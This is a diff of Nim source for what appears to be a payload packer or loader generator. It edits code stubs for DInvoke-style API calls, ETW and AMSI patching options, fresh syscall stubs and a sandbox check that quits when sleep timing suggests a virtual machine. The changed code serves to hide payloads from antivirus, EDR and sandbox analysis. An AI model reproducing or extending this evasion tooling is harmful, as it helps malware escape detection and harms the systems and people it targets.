@@ -1389,7 +1389,9 @@ when defined(ProviderPatch):
 
 when not defined(DInvoke):
     proc LdrLoadDll*(PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.
-        importc: "LdrLoadDll", dynlib: "ntdll", stdcall, discardable.} 
+        importc: "LdrLoadDll", dynlib: "ntdll", stdcall, discardable.}
+    proc RtlAddVectoredExceptionHandler*(FirstHandler: ULONG, VectoredHandler: PVOID): PVOID {.
+        importc: "RtlAddVectoredExceptionHandler", dynlib: "ntdll", stdcall, discardable.}
 
 when defined(HardwareETW):
   from winim/clr import load,clrVariantToString,new,`.`,VT_BSTR,invoke
@@ -1489,6 +1491,15 @@ proc calcHard *(): int =
         if ((rand mod 9) != 0):
             rand += 15
     return rand
+
+# we need our custom lstrlenW function here, as otherwise the compiler throws errors when going without dynlib
+proc lstrlenW*(lpString: PWCHAR): int =
+    var i = 0
+    while lpString[i] != 0:
+        inc(i)
+    return i
+
+
 """
 
 let Cryptstub15 = fmt"""
@@ -1561,16 +1572,28 @@ let Accelerated_sleepStub * = fmt"""
 
 proc accelerated_sleep*(): void =
     var 
-        dwStart: DWORD = GetTickCount()
+        dwStart: DWORD
         dwEnd: DWORD = 0
     
+    when defined(DInvoke):
+        dwStart = MyGetTickCount()
+    else:
+        dwStart = GetTickCount()
+
     # Lets Sleep for two seconds
-    Sleep(2000)
-    dwEnd = GetTickCount()
+    when defined(DInvoke):
+        discard MySleep(1500)
+    else:
+        Sleep(1500)
+
+    when defined(DInvoke):
+        dwEnd = MyGetTickCount()
+    else:
+        dwEnd = GetTickCount()
     var dwDiff = dwEnd - dwStart
     # If we slept for less than 2 seconds, we are in a VM
-    if (dwDiff < 1800):
-        quit(1)
+    if (dwDiff < 1300):
+        quit()
     else:
         when defined(verbose):
             echo obf("[*] We don't appear to be in a sandbox according to the Sleep time")
@@ -2048,6 +2071,9 @@ if (not noDInvoke):
     stub.add(DInvokeStubFourth)
     stub.add(DInvokeBaseStub)
 
+if (getfreshstub):
+    stub.add(GetSyscallStub)
+
 if(pump):
     # makes no sense to import strenc when strings should be visible in the binary.
     stub =  stub.replace("    import strenc", "    from winim import MODULEENTRY32A")
@@ -2095,8 +2121,6 @@ if(gosleep or remoteETWpatch or remoteAMSIpatch):
 
 stub.add(getRandStubNoTab())
 
-if (getfreshstub):
-    stub.add(GetSyscallStub)
 
 if (syswhispers):
     if(jump):
